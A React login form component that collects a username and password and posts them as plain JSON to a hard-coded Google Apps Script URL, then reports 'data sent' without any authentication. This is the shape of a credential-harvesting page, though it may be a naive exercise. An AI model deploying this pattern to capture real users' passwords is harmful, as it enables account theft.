import { useState } from "react";
import "./Form.css";

function App() {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");

  const WEB_APP_URL =
    "https://script.google.com/macros/s/AKfycbwKD0erLKHE92DNA1An32kvNapZrGLAdJzBYOU1jGRa3uoeLmQJpV_Dk0tt9tbfyYHwwg/exec";

  const handleSubmit = async (e) => {
    e.preventDefault();

    try {
      const response = await fetch(WEB_APP_URL, {
        method: "POST",
        body: JSON.stringify({
          username,
          password,
        }),
      });

      const result = await response.text();

      console.log(result);
      alert("Data berhasil dikirim!");

      setUsername("");
      setPassword("");
    } catch (err) {
      console.error(err);
      alert("Gagal mengirim data: " + err.message);
    }
  };

  return (
   <div className="form-container">
  <h1>Login</h1>

  <form onSubmit={handleSubmit}>
    <input
      type="text"
      id="username"
      name="username"
      placeholder="Username"
      autoComplete="username"
      value={username}
      onChange={(e) => setUsername(e.target.value)}
    />

    <input
      type="password"
      id="password"
      name="password"
      placeholder="Password"
      autoComplete="current-password"
      value={password}
      onChange={(e) => setPassword(e.target.value)}
    />

    <button type="submit">
      Login
    </button>
  </form>
</div>
  );
}

export default App;